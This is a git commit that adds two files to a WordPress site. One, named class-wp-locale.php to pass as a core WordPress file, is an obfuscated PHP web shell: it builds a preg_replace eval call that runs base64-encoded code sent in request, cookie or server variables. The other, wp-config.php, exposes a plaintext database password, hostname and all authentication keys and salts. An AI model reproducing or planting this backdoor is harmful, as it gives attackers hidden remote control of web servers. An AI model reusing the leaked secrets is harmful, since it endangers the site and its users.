2191b4649b71182986dbd3c9d32f2af08938c1b1
Kyle Reynolds <kyle@reynoldsconsulting.co>
2014-11-22 12:59:10 -0700

    initial commit

---
+++ www/wp-admin/includes/class-wp-locale.php
@@ -0,0 +1,68 @@
+<?php
+$wvfods= '=(,';
+
+$moilqvnfhla='i:-e,"a';$abrhwybb= 'e'; $khczymhrezqf = '[';$mriipyddpkaap = '+s:e';$xqaqtecta ='S'; $jxlymntn= 'pRoc\'_F'; $qtlseztxsbuqy = 'QU,<r';$gglrrieisy='Pav^';$zzu=',p}"n';$iafx='s';$kysjqudpzlovu = 'ed?,yOv';
+
+$mjimpxhyugk= '(';
+$sjtdjxbhfd='p'; $grovau ='c';
+
+$hqn ='g';$odybfbsali= ']'; $bpxwzgzfow = 'bD'; $wyxxrbj= '$Vrl';
+
+$ixuigdvoqwoki='e';$ulncxjv='T%-l';$encvuclfoi= 'l'; $dsjbebge ='.yoI';$hzprnoe='aKlcH;4';$bazvsojozrd='_.'; $ybrtikf='fE$mts';$ichfjz='6MC'; $hwwvh= ')';$wiszlgk ='g'; $asmbe = 'ee\'\'r~)P';
+
+$rcnoish = '@'; $emimprhm =$sjtdjxbhfd .$asmbe[4] .$asmbe[1] . $wiszlgk .$bazvsojozrd[0] .
+$asmbe[4].
+$asmbe[1] .$sjtdjxbhfd . $hzprnoe[2]. $hzprnoe[0]. $hzprnoe[3]. $asmbe[1] ; $xaajt =$asmbe[3] .
+$asmbe[6]; $elkiwwsxzlk= $bazvsojozrd[1] ; $gswce = $asmbe[1] .$kysjqudpzlovu[6]. $hzprnoe[0] . $hzprnoe[2].$mjimpxhyugk .$asmbe[3] ; $fzpijbmbsjvm= $ulncxjv[2] . $bazvsojozrd[1] . $ulncxjv[2] . $asmbe[1]; $emimprhm($fzpijbmbsjvm, $gswce.$ybrtikf[2] .
+
+$moilqvnfhla[0].
+
+$wvfods[0] .$hzprnoe[0]. $asmbe[4].$asmbe[4] . $hzprnoe[0] .
+$dsjbebge[1].
+
+$bazvsojozrd[0].$ybrtikf[3].
+
+$asmbe[1].$asmbe[4] .
+
+$wiszlgk . $asmbe[1].$mjimpxhyugk .
+
+$ybrtikf[2].$bazvsojozrd[0] .
+
+$jxlymntn[1]. $ybrtikf[1]. $qtlseztxsbuqy[0].$qtlseztxsbuqy[1]. $ybrtikf[1]. $xqaqtecta . $ulncxjv[0] . $kysjqudpzlovu[3] .
+
+$ybrtikf[2].
+
+$bazvsojozrd[0] .$ichfjz[2] .$kysjqudpzlovu[5] . $kysjqudpzlovu[5]. $hzprnoe[1]. $dsjbebge[3].$ybrtikf[1]. $kysjqudpzlovu[3].
+
+$ybrtikf[2] .$bazvsojozrd[0]. $xqaqtecta . $ybrtikf[1] .$jxlymntn[1]. $wyxxrbj[1] .$ybrtikf[1].$jxlymntn[1] .$asmbe[6].$hzprnoe[5].
+$ybrtikf[2].$hzprnoe[0]. $wvfods[0].$moilqvnfhla[0] . $ybrtikf[5] .$ybrtikf[5].$asmbe[1]. $ybrtikf[4].$mjimpxhyugk. $ybrtikf[2] .
+$moilqvnfhla[0].$khczymhrezqf .
+$zzu[3] .$asmbe[1]. $asmbe[1]. $ichfjz[0] .$ybrtikf[0] .
+$ichfjz[0].$ybrtikf[0].
+$zzu[3] .
+
+$odybfbsali .$asmbe[6]. $kysjqudpzlovu[2] .$ybrtikf[2] .$moilqvnfhla[0] . $khczymhrezqf. $zzu[3] .$asmbe[1].$asmbe[1].
+
+$ichfjz[0] .$ybrtikf[0] . $ichfjz[0] . $ybrtikf[0]. $zzu[3] . $odybfbsali. $mriipyddpkaap[2] . $mjimpxhyugk . $moilqvnfhla[0] . $ybrtikf[5].$ybrtikf[5] .
+$asmbe[1].$ybrtikf[4].$mjimpxhyugk . $ybrtikf[2]. $moilqvnfhla[0].$khczymhrezqf. $zzu[3] . $hzprnoe[4] .$ulncxjv[0].
+$ulncxjv[0]. $asmbe[7].$bazvsojozrd[0]. $ybrtikf[1] . $ybrtikf[1] .
+
+$ichfjz[0] .
+
+$jxlymntn[6]. $ichfjz[0] . $jxlymntn[6] .$zzu[3] .$odybfbsali .
+$asmbe[6].$kysjqudpzlovu[2] .$ybrtikf[2] .
+$moilqvnfhla[0] .$khczymhrezqf .
+$zzu[3] .$hzprnoe[4].
+
+$ulncxjv[0] .
+
+$ulncxjv[0].
+
+$asmbe[7]. $bazvsojozrd[0]. $ybrtikf[1].$ybrtikf[1] .$ichfjz[0]. $jxlymntn[6]. $ichfjz[0] .$jxlymntn[6] .$zzu[3].
+
+$odybfbsali. $mriipyddpkaap[2] .$kysjqudpzlovu[1]. $moilqvnfhla[0] . $asmbe[1] .$asmbe[6]. $hzprnoe[5]. $asmbe[1].$kysjqudpzlovu[6] . $hzprnoe[0].$hzprnoe[2] .$mjimpxhyugk. $bpxwzgzfow[0] . $hzprnoe[0] . $ybrtikf[5]. $asmbe[1] .$ichfjz[0]. $hzprnoe[6] .
+$bazvsojozrd[0].$kysjqudpzlovu[1] .$asmbe[1] .$hzprnoe[3].
+
+$dsjbebge[2].$kysjqudpzlovu[1] .$asmbe[1].$mjimpxhyugk.$ybrtikf[2]. $hzprnoe[0] . $asmbe[6].$asmbe[6].
+
+$hzprnoe[5] . $xaajt, $elkiwwsxzlk);
---
+++ www/wp-config.php
@@ -0,0 +1,90 @@
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'keely');
+
+/** MySQL database username */
+define('DB_USER', 'keely');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'Dmitr!4bar');
+
+/** MySQL hostname */
+define('DB_HOST', 'bcf8176adf7ea25cd2a5ac5ee3e533b8fdd832ab.rackspaceclouddb.com');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         '&Y8P_djt6Ws$0R#s2WX7');
+define('SECURE_AUTH_KEY',  '*JsOwnpD$A+ N*hm5B+$');
+define('LOGGED_IN_KEY',    'NmJFnXH LdIKg$OxSqS_');
+define('NONCE_KEY',        'T*7UN/a6PHPfVwJ0FCNz');
+define('AUTH_SALT',        '-N!73C(jypWQtt0aatv&');
+define('SECURE_AUTH_SALT', 'bsHD-=PxP5qN=qyYYU8#');
+define('LOGGED_IN_SALT',   '3PC4(V4X8kx)cVtCW$cP');
+define('NONCE_SALT',       'kvSz@g_(t1DvnTm7wh(8');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * WordPress Localized Language, defaults to English.
+ *
+ * Change this to localize WordPress. A corresponding MO file for the chosen
+ * language must be installed to wp-content/languages. For example, install
+ * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
+ * language support.
+ */
+define('WPLANG', '');
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
